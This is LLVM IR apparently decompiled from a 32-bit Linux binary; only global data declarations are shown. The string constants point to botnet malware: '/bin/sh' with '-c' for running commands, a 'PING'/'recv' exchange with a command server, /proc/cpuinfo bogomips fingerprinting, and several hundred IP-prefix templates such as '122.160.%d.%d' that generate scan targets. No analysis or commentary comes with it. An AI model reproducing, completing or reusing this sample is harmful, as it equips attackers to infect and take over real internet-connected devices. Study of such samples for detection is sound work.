source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat64 = type { i64, i64, i32, i32, i32, i32, i64, i64, i64, i32, i32, i64, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }
%pollfd = type { i32, i16, i16 }

@sf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80717fc.11 = global i32 0
@global_var_8071824.12 = local_unnamed_addr global i32* @global_var_80717fc.11
@global_var_8071000.13 = global i32 16
@global_var_8071800.15 = local_unnamed_addr global i32 0
@global_var_8071b60.16 = global i32 0
@global_var_8071b64.17 = local_unnamed_addr global i32 0
@global_var_8071b68.18 = local_unnamed_addr global i32 0
@global_var_80718f8.19 = local_unnamed_addr global i32 4095
@global_var_80718f4.20 = local_unnamed_addr global i32 362436
@global_var_8068597.21 = constant [7 x i8] c"(null)\00"
@global_var_806859e.22 = constant [9 x i8] c"buf: %s\0A\00"
@global_var_8075b60.23 = local_unnamed_addr global i32 0
@global_var_80685a7.24 = constant [3 x i8] c"-c\00"
@global_var_80685aa.25 = constant [3 x i8] c"sh\00"
@global_var_80685ad.26 = constant [8 x i8] c"/bin/sh\00"
@global_var_80685c0.27 = constant i32 -1
@global_var_80689c0.28 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_80689ce.29 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_80689d7.31 = constant [5 x i8] c"PING\00"
@global_var_80689dc.32 = constant [10 x i8] c"recv: %s\0A\00"
@global_var_80689e6.33 = constant [14 x i8] c"gethostbyname\00"
@global_var_8071b48.34 = local_unnamed_addr global i32 0
@global_var_8071b4c.35 = local_unnamed_addr global i32 0
@global_var_8078874.36 = local_unnamed_addr global i32 0
@global_var_80689f4.37 = constant [6 x i8] c":>%$#\00"
@global_var_8071b57.38 = local_unnamed_addr global i32 0
@global_var_8071b5a.41 = local_unnamed_addr global i32 0
@global_var_80689fb.42 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_8068a07.43 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_8068a12.44 = constant [14 x i8] c"101.108.%d.%d\00"
@global_var_8068a20.45 = constant [14 x i8] c"101.109.%d.%d\00"
@global_var_8068a2e.46 = constant [14 x i8] c"101.248.%d.%d\00"
@global_var_8068a3c.47 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_8068a49.48 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_8068a56.49 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_8068a64.50 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_8068a72.51 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_8068a7f.52 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_8068a8d.53 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_8068a9b.54 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_8068aa9.55 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_8068ab7.56 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_8068ac5.57 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_8068ad3.58 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_8068ae1.59 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_8068aef.60 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_8068afd.61 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_8068b0b.62 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_8068b19.63 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_8068b27.64 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_8068b34.65 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_8068b41.66 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_8068b4e.67 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_8068b5b.68 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_8068b68.69 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_8068b75.70 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_8068b82.71 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_8068b8f.72 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_8068b9c.73 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_8068ba9.74 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_8068bb6.75 = constant [14 x i8] c"106.108.%d.%d\00"
@global_var_8068bc4.76 = constant [14 x i8] c"106.110.%d.%d\00"
@global_var_8068bd2.77 = constant [14 x i8] c"106.112.%d.%d\00"
@global_var_8068be0.78 = constant [14 x i8] c"106.113.%d.%d\00"
@global_var_8068bee.79 = constant [14 x i8] c"106.114.%d.%d\00"
@global_var_8068bfc.80 = constant [14 x i8] c"106.115.%d.%d\00"
@global_var_8068c0a.81 = constant [14 x i8] c"106.116.%d.%d\00"
@global_var_8068c18.82 = constant [14 x i8] c"106.117.%d.%d\00"
@global_var_8068c26.83 = constant [14 x i8] c"106.118.%d.%d\00"
@global_var_8068c34.84 = constant [14 x i8] c"106.119.%d.%d\00"
@global_var_8068c42.85 = constant [14 x i8] c"106.122.%d.%d\00"
@global_var_8068c50.86 = constant [14 x i8] c"106.123.%d.%d\00"
@global_var_8068c5e.87 = constant [14 x i8] c"106.124.%d.%d\00"
@global_var_8068c6c.88 = constant [14 x i8] c"106.125.%d.%d\00"
@global_var_8068c7a.89 = constant [14 x i8] c"106.126.%d.%d\00"
@global_var_8068c88.90 = constant [14 x i8] c"106.127.%d.%d\00"
@global_var_8068c96.91 = constant [13 x i8] c"106.16.%d.%d\00"
@global_var_8068ca3.92 = constant [13 x i8] c"106.18.%d.%d\00"
@global_var_8068cb0.93 = constant [14 x i8] c"106.224.%d.%d\00"
@global_var_8068cbe.94 = constant [14 x i8] c"106.228.%d.%d\00"
@global_var_8068ccc.95 = constant [14 x i8] c"106.229.%d.%d\00"
@global_var_8068cda.96 = constant [14 x i8] c"106.230.%d.%d\00"
@global_var_8068ce8.97 = constant [13 x i8] c"106.32.%d.%d\00"
@global_var_8068cf5.98 = constant [13 x i8] c"106.33.%d.%d\00"
@global_var_8068d02.99 = constant [13 x i8] c"106.34.%d.%d\00"
@global_var_8068d0f.100 = constant [13 x i8] c"106.35.%d.%d\00"
@global_var_8068d1c.101 = constant [13 x i8] c"106.36.%d.%d\00"
@global_var_8068d29.102 = constant [12 x i8] c"106.4.%d.%d\00"
@global_var_8068d35.103 = constant [13 x i8] c"106.40.%d.%d\00"
@global_var_8068d42.104 = constant [13 x i8] c"106.41.%d.%d\00"
@global_var_8068d4f.105 = constant [13 x i8] c"106.42.%d.%d\00"
@global_var_8068d5c.106 = constant [13 x i8] c"106.43.%d.%d\00"
@global_var_8068d69.107 = constant [13 x i8] c"106.44.%d.%d\00"
@global_var_8068d76.108 = constant [13 x i8] c"106.45.%d.%d\00"
@global_var_8068d83.109 = constant [13 x i8] c"106.46.%d.%d\00"
@global_var_8068d90.110 = constant [13 x i8] c"106.56.%d.%d\00"
@global_var_8068d9d.111 = constant [13 x i8] c"106.58.%d.%d\00"
@global_var_8068daa.112 = constant [12 x i8] c"106.6.%d.%d\00"
@global_var_8068db6.113 = constant [13 x i8] c"106.60.%d.%d\00"
@global_var_8068dc3.114 = constant [13 x i8] c"106.62.%d.%d\00"
@global_var_8068dd0.115 = constant [12 x i8] c"106.7.%d.%d\00"
@global_var_8068ddc.116 = constant [12 x i8] c"106.8.%d.%d\00"
@global_var_8068de8.117 = constant [13 x i8] c"106.80.%d.%d\00"
@global_var_8068df5.118 = constant [13 x i8] c"106.82.%d.%d\00"
@global_var_8068e02.119 = constant [13 x i8] c"106.84.%d.%d\00"
@global_var_8068e0f.120 = constant [13 x i8] c"106.86.%d.%d\00"
@global_var_8068e1c.121 = constant [13 x i8] c"106.88.%d.%d\00"
@global_var_8068e29.122 = constant [12 x i8] c"106.9.%d.%d\00"
@global_var_8068e35.123 = constant [13 x i8] c"106.90.%d.%d\00"
@global_var_8068e42.124 = constant [13 x i8] c"106.92.%d.%d\00"
@global_var_8068e4f.125 = constant [14 x i8] c"109.184.%d.%d\00"
@global_var_8068e5d.126 = constant [14 x i8] c"110.136.%d.%d\00"
@global_var_8068e6b.127 = constant [14 x i8] c"110.137.%d.%d\00"
@global_var_8068e79.128 = constant [14 x i8] c"110.138.%d.%d\00"
@global_var_8068e87.129 = constant [14 x i8] c"110.139.%d.%d\00"
@global_var_8068e95.130 = constant [14 x i8] c"110.152.%d.%d\00"
@global_var_8068ea3.131 = constant [14 x i8] c"110.156.%d.%d\00"
@global_var_8068eb1.132 = constant [14 x i8] c"110.166.%d.%d\00"
@global_var_8068ebf.133 = constant [14 x i8] c"110.176.%d.%d\00"
@global_var_8068ecd.134 = constant [14 x i8] c"110.184.%d.%d\00"
@global_var_8068edb.135 = constant [14 x i8] c"110.224.%d.%d\00"
@global_var_8068ee9.136 = constant [14 x i8] c"110.225.%d.%d\00"
@global_var_8068ef7.137 = constant [14 x i8] c"110.227.%d.%d\00"
@global_var_8068f05.138 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_8068f13.139 = constant [13 x i8] c"110.80.%d.%d\00"
@global_var_8068f20.140 = constant [13 x i8] c"110.88.%d.%d\00"
@global_var_8068f2d.141 = constant [14 x i8] c"111.112.%d.%d\00"
@global_var_8068f3b.142 = constant [14 x i8] c"111.120.%d.%d\00"
@global_var_8068f49.143 = constant [14 x i8] c"111.124.%d.%d\00"
@global_var_8068f57.144 = constant [14 x i8] c"111.126.%d.%d\00"
@global_var_8068f65.145 = constant [14 x i8] c"111.170.%d.%d\00"
@global_var_8068f73.146 = constant [14 x i8] c"111.172.%d.%d\00"
@global_var_8068f81.147 = constant [14 x i8] c"111.176.%d.%d\00"
@global_var_8068f8f.148 = constant [14 x i8] c"111.224.%d.%d\00"
@global_var_8068f9d.149 = constant [13 x i8] c"111.72.%d.%d\00"
@global_var_8068faa.150 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_8068fb6.151 = constant [14 x i8] c"112.100.%d.%d\00"
@global_var_8068fc4.152 = constant [14 x i8] c"112.112.%d.%d\00"
@global_var_8068fd2.153 = constant [14 x i8] c"112.116.%d.%d\00"
@global_var_8068fe0.154 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_8068fee.155 = constant [14 x i8] c"112.200.%d.%d\00"
@global_var_8068ffc.156 = constant [14 x i8] c"112.201.%d.%d\00"
@global_var_806900a.157 = constant [14 x i8] c"112.202.%d.%d\00"
@global_var_8069018.158 = constant [14 x i8] c"112.203.%d.%d\00"
@global_var_8069026.159 = constant [14 x i8] c"112.204.%d.%d\00"
@global_var_8069034.160 = constant [14 x i8] c"112.205.%d.%d\00"
@global_var_8069042.161 = constant [14 x i8] c"112.206.%d.%d\00"
@global_var_8069050.162 = constant [14 x i8] c"112.207.%d.%d\00"
@global_var_806905e.163 = constant [14 x i8] c"112.208.%d.%d\00"
@global_var_806906c.164 = constant [14 x i8] c"112.209.%d.%d\00"
@global_var_806907a.165 = constant [14 x i8] c"112.210.%d.%d\00"
@global_var_8069088.166 = constant [14 x i8] c"112.211.%d.%d\00"
@global_var_8069096.167 = constant [14 x i8] c"112.212.%d.%d\00"
@global_var_80690a4.168 = constant [14 x i8] c"112.213.%d.%d\00"
@global_var_80690b2.169 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_80690bf.170 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_80690cc.171 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_80690d9.172 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_80690e6.173 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_80690f3.174 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_8069100.175 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_806910d.176 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_8069119.177 = constant [13 x i8] c"112.66.%d.%d\00"
@global_var_8069126.178 = constant [13 x i8] c"112.98.%d.%d\00"
@global_var_8069133.179 = constant [14 x i8] c"113.112.%d.%d\00"
@global_var_8069141.180 = constant [13 x i8] c"113.12.%d.%d\00"
@global_var_806914e.181 = constant [14 x i8] c"113.120.%d.%d\00"
@global_var_806915c.182 = constant [14 x i8] c"113.128.%d.%d\00"
@global_var_806916a.183 = constant [14 x i8] c"113.132.%d.%d\00"
@global_var_8069178.184 = constant [14 x i8] c"113.136.%d.%d\00"
@global_var_8069186.185 = constant [13 x i8] c"113.16.%d.%d\00"
@global_var_8069193.186 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_80691a1.187 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_80691af.188 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_80691bd.189 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_80691cb.190 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_80691d9.191 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_80691e7.192 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_80691f5.193 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_8069203.194 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_8069211.195 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_806921f.196 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_806922d.197 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_806923b.198 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_8069249.199 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_8069257.200 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_8069265.201 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_8069273.202 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_8069281.203 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_806928f.204 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_806929d.205 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_80692ab.206 = constant [14 x i8] c"113.218.%d.%d\00"
@global_var_80692b9.207 = constant [14 x i8] c"113.220.%d.%d\00"
@global_var_80692c7.208 = constant [13 x i8] c"113.24.%d.%d\00"
@global_var_80692d4.209 = constant [14 x i8] c"113.240.%d.%d\00"
@global_var_80692e2.210 = constant [14 x i8] c"113.248.%d.%d\00"
@global_var_80692f0.211 = constant [13 x i8] c"113.53.%d.%d\00"
@global_var_80692fd.212 = constant [13 x i8] c"113.62.%d.%d\00"
@global_var_806930a.213 = constant [13 x i8] c"113.64.%d.%d\00"
@global_var_8069317.214 = constant [13 x i8] c"113.96.%d.%d\00"
@global_var_8069324.215 = constant [14 x i8] c"114.104.%d.%d\00"
@global_var_8069332.216 = constant [14 x i8] c"114.135.%d.%d\00"
@global_var_8069340.217 = constant [14 x i8] c"114.138.%d.%d\00"
@global_var_806934e.218 = constant [14 x i8] c"114.216.%d.%d\00"
@global_var_806935c.219 = constant [14 x i8] c"114.224.%d.%d\00"
@global_var_806936a.220 = constant [13 x i8] c"114.67.%d.%d\00"
@global_var_8069377.221 = constant [13 x i8] c"114.96.%d.%d\00"
@global_var_8069384.222 = constant [14 x i8] c"115.148.%d.%d\00"
@global_var_8069392.223 = constant [14 x i8] c"115.152.%d.%d\00"
@global_var_80693a0.224 = constant [14 x i8] c"115.168.%d.%d\00"
@global_var_80693ae.225 = constant [14 x i8] c"115.169.%d.%d\00"
@global_var_80693bc.226 = constant [14 x i8] c"115.170.%d.%d\00"
@global_var_80693ca.227 = constant [14 x i8] c"115.192.%d.%d\00"
@global_var_80693d8.228 = constant [14 x i8] c"115.224.%d.%d\00"
@global_var_80693e6.229 = constant [12 x i8] c"116.1.%d.%d\00"
@global_var_80693f2.230 = constant [13 x i8] c"116.16.%d.%d\00"
@global_var_80693ff.231 = constant [14 x i8] c"116.204.%d.%d\00"
@global_var_806940d.232 = constant [14 x i8] c"116.207.%d.%d\00"
@global_var_806941b.233 = constant [14 x i8] c"116.208.%d.%d\00"
@global_var_8069429.234 = constant [14 x i8] c"116.248.%d.%d\00"
@global_var_8069437.235 = constant [14 x i8] c"116.252.%d.%d\00"
@global_var_8069445.236 = constant [12 x i8] c"116.4.%d.%d\00"
@global_var_8069451.237 = constant [13 x i8] c"116.52.%d.%d\00"
@global_var_806945e.238 = constant [13 x i8] c"116.68.%d.%d\00"
@global_var_806946b.239 = constant [13 x i8] c"116.69.%d.%d\00"
@global_var_8069478.240 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_8069485.241 = constant [12 x i8] c"116.8.%d.%d\00"
@global_var_8069491.242 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_806949e.243 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_80694ac.244 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_80694ba.245 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_80694c8.246 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_80694d6.247 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_80694e4.248 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_80694f2.249 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_8069500.250 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_806950e.251 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_806951c.252 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_806952a.253 = constant [14 x i8] c"117.192.%d.%d\00"
@global_var_8069538.254 = constant [14 x i8] c"117.193.%d.%d\00"
@global_var_8069546.255 = constant [14 x i8] c"117.194.%d.%d\00"
@global_var_8069554.256 = constant [14 x i8] c"117.195.%d.%d\00"
@global_var_8069562.257 = constant [14 x i8] c"117.196.%d.%d\00"
@global_var_8069570.258 = constant [14 x i8] c"117.197.%d.%d\00"
@global_var_806957e.259 = constant [14 x i8] c"117.198.%d.%d\00"
@global_var_806958c.260 = constant [14 x i8] c"117.199.%d.%d\00"
@global_var_806959a.261 = constant [14 x i8] c"117.200.%d.%d\00"
@global_var_80695a8.262 = constant [14 x i8] c"117.201.%d.%d\00"
@global_var_80695b6.263 = constant [14 x i8] c"117.202.%d.%d\00"
@global_var_80695c4.264 = constant [14 x i8] c"117.203.%d.%d\00"
@global_var_80695d2.265 = constant [14 x i8] c"117.204.%d.%d\00"
@global_var_80695e0.266 = constant [14 x i8] c"117.205.%d.%d\00"
@global_var_80695ee.267 = constant [14 x i8] c"117.206.%d.%d\00"
@global_var_80695fc.268 = constant [14 x i8] c"117.207.%d.%d\00"
@global_var_806960a.269 = constant [13 x i8] c"117.21.%d.%d\00"
@global_var_8069617.270 = constant [14 x i8] c"117.210.%d.%d\00"
@global_var_8069625.271 = constant [14 x i8] c"117.212.%d.%d\00"
@global_var_8069633.272 = constant [14 x i8] c"117.213.%d.%d\00"
@global_var_8069641.273 = constant [14 x i8] c"117.214.%d.%d\00"
@global_var_806964f.274 = constant [14 x i8] c"117.215.%d.%d\00"
@global_var_806965d.275 = constant [14 x i8] c"117.216.%d.%d\00"
@global_var_806966b.276 = constant [14 x i8] c"117.217.%d.%d\00"
@global_var_8069679.277 = constant [14 x i8] c"117.218.%d.%d\00"
@global_var_8069687.278 = constant [14 x i8] c"117.219.%d.%d\00"
@global_var_8069695.279 = constant [13 x i8] c"117.22.%d.%d\00"
@global_var_80696a2.280 = constant [14 x i8] c"117.220.%d.%d\00"
@global_var_80696b0.281 = constant [14 x i8] c"117.221.%d.%d\00"
@global_var_80696be.282 = constant [14 x i8] c"117.222.%d.%d\00"
@global_var_80696cc.283 = constant [14 x i8] c"117.223.%d.%d\00"
@global_var_80696da.284 = constant [14 x i8] c"117.224.%d.%d\00"
@global_var_80696e8.285 = constant [14 x i8] c"117.225.%d.%d\00"
@global_var_80696f6.286 = constant [14 x i8] c"117.226.%d.%d\00"
@global_var_8069704.287 = constant [13 x i8] c"117.24.%d.%d\00"
@global_var_8069711.288 = constant [13 x i8] c"117.32.%d.%d\00"
@global_var_806971e.289 = constant [13 x i8] c"117.40.%d.%d\00"
@global_var_806972b.290 = constant [13 x i8] c"117.44.%d.%d\00"
@global_var_8069738.291 = constant [13 x i8] c"117.57.%d.%d\00"
@global_var_8069745.292 = constant [13 x i8] c"117.60.%d.%d\00"
@global_var_8069752.293 = constant [13 x i8] c"117.64.%d.%d\00"
@global_var_806975f.294 = constant [13 x i8] c"117.80.%d.%d\00"
@global_var_806976c.295 = constant [13 x i8] c"117.99.%d.%d\00"
@global_var_8069779.296 = constant [14 x i8] c"118.112.%d.%d\00"
@global_var_8069787.297 = constant [14 x i8] c"118.120.%d.%d\00"
@global_var_8069795.298 = constant [14 x i8] c"118.124.%d.%d\00"
@global_var_80697a3.299 = constant [14 x i8] c"118.175.%d.%d\00"
@global_var_80697b1.300 = constant [14 x i8] c"118.180.%d.%d\00"
@global_var_80697bf.301 = constant [14 x i8] c"118.186.%d.%d\00"
@global_var_80697cd.302 = constant [14 x i8] c"118.192.%d.%d\00"
@global_var_80697db.303 = constant [14 x i8] c"118.213.%d.%d\00"
@global_var_80697e9.304 = constant [14 x i8] c"118.215.%d.%d\00"
@global_var_80697f7.305 = constant [14 x i8] c"118.239.%d.%d\00"
@global_var_8069805.306 = constant [14 x i8] c"118.248.%d.%d\00"
@global_var_8069813.307 = constant [13 x i8] c"118.30.%d.%d\00"
@global_var_8069820.308 = constant [13 x i8] c"118.84.%d.%d\00"
@global_var_806982d.309 = constant [13 x i8] c"118.96.%d.%d\00"
@global_var_806983a.310 = constant [13 x i8] c"118.97.%d.%d\00"
@global_var_8069847.311 = constant [13 x i8] c"118.98.%d.%d\00"
@global_var_8069854.312 = constant [12 x i8] c"119.0.%d.%d\00"
@global_var_8069860.313 = constant [14 x i8] c"119.111.%d.%d\00"
@global_var_806986e.314 = constant [14 x i8] c"119.120.%d.%d\00"
@global_var_806987c.315 = constant [14 x i8] c"119.128.%d.%d\00"
@global_var_806988a.316 = constant [14 x i8] c"119.144.%d.%d\00"
@global_var_8069898.317 = constant [14 x i8] c"119.150.%d.%d\00"
@global_var_80698a6.318 = constant [14 x i8] c"119.151.%d.%d\00"
@global_var_80698b4.319 = constant [14 x i8] c"119.152.%d.%d\00"
@global_var_80698c2.320 = constant [14 x i8] c"119.153.%d.%d\00"
@global_var_80698d0.321 = constant [14 x i8] c"119.154.%d.%d\00"
@global_var_80698de.322 = constant [14 x i8] c"119.155.%d.%d\00"
@global_var_80698ec.323 = constant [14 x i8] c"119.156.%d.%d\00"
@global_var_80698fa.324 = constant [14 x i8] c"119.157.%d.%d\00"
@global_var_8069908.325 = constant [14 x i8] c"119.158.%d.%d\00"
@global_var_8069916.326 = constant [14 x i8] c"119.159.%d.%d\00"
@global_var_8069924.327 = constant [13 x i8] c"119.19.%d.%d\00"
@global_var_8069931.328 = constant [13 x i8] c"119.20.%d.%d\00"
@global_var_806993e.329 = constant [13 x i8] c"119.41.%d.%d\00"
@global_var_806994b.330 = constant [13 x i8] c"119.60.%d.%d\00"
@global_var_8069958.331 = constant [12 x i8] c"119.8.%d.%d\00"
@global_var_8069964.332 = constant [13 x i8] c"119.84.%d.%d\00"
@global_var_8069971.333 = constant [13 x i8] c"119.92.%d.%d\00"
@global_var_806997e.334 = constant [13 x i8] c"119.93.%d.%d\00"
@global_var_806998b.335 = constant [13 x i8] c"119.94.%d.%d\00"
@global_var_8069998.336 = constant [13 x i8] c"119.96.%d.%d\00"
@global_var_80699a5.337 = constant [13 x i8] c"120.32.%d.%d\00"
@global_var_80699b2.338 = constant [13 x i8] c"120.40.%d.%d\00"
@global_var_80699bf.339 = constant [13 x i8] c"120.56.%d.%d\00"
@global_var_80699cc.340 = constant [13 x i8] c"120.57.%d.%d\00"
@global_var_80699d9.341 = constant [13 x i8] c"120.59.%d.%d\00"
@global_var_80699e6.342 = constant [13 x i8] c"120.60.%d.%d\00"
@global_var_80699f3.343 = constant [13 x i8] c"120.61.%d.%d\00"
@global_var_8069a00.344 = constant [13 x i8] c"120.62.%d.%d\00"
@global_var_8069a0d.345 = constant [13 x i8] c"120.63.%d.%d\00"
@global_var_8069a1a.346 = constant [13 x i8] c"120.68.%d.%d\00"
@global_var_8069a27.347 = constant [14 x i8] c"121.201.%d.%d\00"
@global_var_8069a35.348 = constant [14 x i8] c"121.204.%d.%d\00"
@global_var_8069a43.349 = constant [14 x i8] c"121.224.%d.%d\00"
@global_var_8069a51.350 = constant [13 x i8] c"121.32.%d.%d\00"
@global_var_8069a5e.351 = constant [13 x i8] c"121.36.%d.%d\00"
@global_var_8069a6b.352 = constant [13 x i8] c"121.37.%d.%d\00"
@global_var_8069a78.353 = constant [13 x i8] c"121.56.%d.%d\00"
@global_var_8069a85.354 = constant [13 x i8] c"121.58.%d.%d\00"
@global_var_8069a92.355 = constant [13 x i8] c"121.59.%d.%d\00"
@global_var_8069a9f.356 = constant [13 x i8] c"121.60.%d.%d\00"
@global_var_8069aac.357 = constant [12 x i8] c"121.8.%d.%d\00"
@global_var_8069ab8.358 = constant [13 x i8] c"122.10.%d.%d\00"
@global_var_8069ac5.359 = constant [14 x i8] c"122.160.%d.%d\00"
@global_var_8069ad3.360 = constant [14 x i8] c"122.161.%d.%d\00"
@global_var_8069ae1.361 = constant [14 x i8] c"122.162.%d.%d\00"
@global_var_8069aef.362 = constant [14 x i8] c"122.163.%d.%d\00"
@global_var_8069afd.363 = constant [14 x i8] c"122.164.%d.%d\00"
@global_var_8069b0b.364 = constant [14 x i8] c"122.165.%d.%d\00"
@global_var_8069b19.365 = constant [14 x i8] c"122.166.%d.%d\00"
@global_var_8069b27.366 = constant [14 x i8] c"122.167.%d.%d\00"
@global_var_8069b35.367 = constant [14 x i8] c"122.168.%d.%d\00"
@global_var_8069b43.368 = constant [14 x i8] c"122.169.%d.%d\00"
@global_var_8069b51.369 = constant [14 x i8] c"122.170.%d.%d\00"
@global_var_8069b5f.370 = constant [14 x i8] c"122.171.%d.%d\00"
@global_var_8069b6d.371 = constant [14 x i8] c"122.172.%d.%d\00"
@global_var_8069b7b.372 = constant [14 x i8] c"122.173.%d.%d\00"
@global_var_8069b89.373 = constant [14 x i8] c"122.174.%d.%d\00"
@global_var_8069b97.374 = constant [14 x i8] c"122.175.%d.%d\00"
@global_var_8069ba5.375 = constant [14 x i8] c"122.176.%d.%d\00"
@global_var_8069bb3.376 = constant [14 x i8] c"122.177.%d.%d\00"
@global_var_8069bc1.377 = constant [14 x i8] c"122.178.%d.%d\00"
@global_var_8069bcf.378 = constant [14 x i8] c"122.179.%d.%d\00"
@global_var_8069bdd.379 = constant [14 x i8] c"122.180.%d.%d\00"
@global_var_8069beb.380 = constant [14 x i8] c"122.183.%d.%d\00"
@global_var_8069bf9.381 = constant [14 x i8] c"122.198.%d.%d\00"
@global_var_8069c07.382 = constant [12 x i8] c"122.2.%d.%d\00"
@global_var_8069c13.383 = constant [14 x i8] c"122.224.%d.%d\00"
@global_var_8069c21.384 = constant [14 x i8] c"122.240.%d.%d\00"
@global_var_8069c2f.385 = constant [12 x i8] c"122.3.%d.%d\00"
@global_var_8069c3b.386 = constant [12 x i8] c"122.4.%d.%d\00"
@global_var_8069c47.387 = constant [13 x i8] c"122.48.%d.%d\00"
@global_var_8069c54.388 = constant [13 x i8] c"122.49.%d.%d\00"
@global_var_8069c61.389 = constant [13 x i8] c"122.52.%d.%d\00"
@global_var_8069c6e.390 = constant [13 x i8] c"122.53.%d.%d\00"
@global_var_8069c7b.391 = constant [13 x i8] c"122.54.%d.%d\00"
@global_var_8069c88.392 = constant [13 x i8] c"122.55.%d.%d\00"
@global_var_8069c95.393 = constant [12 x i8] c"122.9.%d.%d\00"
@global_var_8069ca1.394 = constant [14 x i8] c"123.101.%d.%d\00"
@global_var_8069caf.395 = constant [14 x i8] c"123.137.%d.%d\00"
@global_var_8069cbd.396 = constant [14 x i8] c"123.149.%d.%d\00"
@global_var_8069ccb.397 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_8069cd8.398 = constant [14 x i8] c"123.160.%d.%d\00"
@global_var_8069ce6.399 = constant [14 x i8] c"123.164.%d.%d\00"
@global_var_8069cf4.400 = constant [14 x i8] c"123.168.%d.%d\00"
@global_var_8069d02.401 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_8069d0f.402 = constant [14 x i8] c"123.172.%d.%d\00"
@global_var_8069d1d.403 = constant [14 x i8] c"123.174.%d.%d\00"
@global_var_8069d2b.404 = constant [14 x i8] c"123.177.%d.%d\00"
@global_var_8069d39.405 = constant [14 x i8] c"123.178.%d.%d\00"
@global_var_8069d47.406 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_8069d54.407 = constant [14 x i8] c"123.180.%d.%d\00"
@global_var_8069d62.408 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_8069d6f.409 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_8069d7c.410 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_8069d89.411 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_8069d96.412 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_8069da3.413 = constant [13 x i8] c"123.25.%d.%d\00"
